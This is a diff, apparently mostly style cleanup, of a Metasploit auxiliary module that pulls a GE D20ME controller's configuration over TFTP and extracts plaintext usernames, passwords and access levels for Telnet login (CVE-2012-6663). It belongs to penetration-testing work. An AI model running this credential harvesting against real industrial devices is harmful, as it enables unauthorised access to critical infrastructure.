@@ -8,7 +8,6 @@
 # parses the usernames and passwords from it.
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Rex::Ui::Text
   include Rex::Proto::TFTP
@@ -16,28 +15,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'General Electric D20 Password Recovery',
-      'Description'    => %q{
-        The General Electric D20ME and possibly other units (D200?) feature
-        TFTP readable configurations with plaintext passwords.  This module
-        retrieves the username, password, and authentication level list.
-      },
-      'Author'         => [ 'K. Reid Wightman <wightman[at]digitalbond.com>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'General Electric D20 Password Recovery',
+        'Description' => %q{
+          The General Electric D20ME and possibly other units (D200?) feature
+          TFTP readable configurations with plaintext passwords.  This module
+          retrieves the username, password, and authentication level list.
+        },
+        'Author' => [ 'K. Reid Wightman <wightman[at]digitalbond.com>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2012-6663'],
         ],
-      'DisclosureDate' => '2012-01-19'
-      ))
+        'DisclosureDate' => '2012-01-19',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(69),
         Opt::RHOST('192.168.255.1'),
         OptString.new('REMOTE_CONFIG_NAME', [true, "The remote filename used to retrieve the configuration", "NVRAM\\D20.zlb"])
-      ])
+      ]
+    )
   end
 
   def setup
@@ -51,16 +58,16 @@ class MetasploitModule < Msf::Auxiliary
   def cleanup
     if @tftp_client and @tftp_client.respond_to? :complete
       while not @tftp_client.complete
-        select(nil,nil,nil,1)
+        select(nil, nil, nil, 1)
         vprint_status "Cleaning up the TFTP client ports and threads."
         @tftp_client.stop
       end
     end
   end
 
-  def rtarget(ip=nil)
+  def rtarget(ip = nil)
     if (ip or rhost) and rport
-      [(ip || rhost),rport].map {|x| x.to_s}.join(":") << " "
+      [(ip || rhost), rport].map { |x| x.to_s }.join(":") << " "
     elsif (ip or rhost)
       rhost
     else
@@ -72,12 +79,12 @@ class MetasploitModule < Msf::Auxiliary
   def retrieve
     print_status("Retrieving file")
     @tftp_client = Rex::Proto::TFTP::Client.new(
-        "LocalHost" => @lhost,
-        "LocalPort" => @lport,
-        "PeerHost" => @rhost,
-        "PeerPort" => @rport,
-        "RemoteFile" => @rfile,
-        "Action" => :download
+      "LocalHost" => @lhost,
+      "LocalPort" => @lport,
+      "PeerHost" => @rhost,
+      "PeerPort" => @rport,
+      "RemoteFile" => @rfile,
+      "Action" => :download
     )
     @tftp_client.send_read_request { |msg| print_tftp_status(msg) }
     @tftp_client.threads do |thread|
@@ -95,6 +102,7 @@ class MetasploitModule < Msf::Auxiliary
   def makeword(bytestr)
     return bytestr.unpack("n")[0]
   end
+
   # builds abi
   def makelong(bytestr)
     return bytestr.unpack("N")[0]
@@ -160,6 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     if name == myname
       return start
     end
+
     left = leftchild(f, start)
     right = rightchild(f, start)
     if name < myname
@@ -222,9 +231,10 @@ class MetasploitModule < Msf::Auxiliary
     logins = Rex::Text::Table.new(
       'Header' => "D20 usernames, passwords, and account levels\n(use for TELNET authentication)",
       'Indent' => 1,
-      'Columns' => ["Type", "User Name", "Password"])
+      'Columns' => ["Type", "User Name", "Password"]
+    )
 
-    0.upto(numentries -1).each do |i|
+    0.upto(numentries - 1).each do |i|
       f.seek(dstart + headerlen + i * entrylen)
       accounttype = makeword(f.read(2))
       f.seek(dstart + headerlen + i * entrylen + 2)
@@ -235,7 +245,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Bad account parsing at #{dstart + headerlen + i * entrylen}")
         break
       end
-      logins <<  [accounttype,  accountname,  accountpass]
+      logins << [accounttype, accountname, accountpass]
       report_cred(
         ip: datastore['RHOST'],
         port: 23,
@@ -289,11 +299,11 @@ class MetasploitModule < Msf::Auxiliary
   def print_tftp_status(msg)
     case msg
     when /Aborting/, /errors.$/
-      print_error [rtarget,msg].join
+      print_error [rtarget, msg].join
     when /^WRQ accepted/, /^Sending/, /complete!$/
-      print_good [rtarget,msg].join
+      print_good [rtarget, msg].join
     else
-      vprint_status [rtarget,msg].join
+      vprint_status [rtarget, msg].join
     end
   end
 end
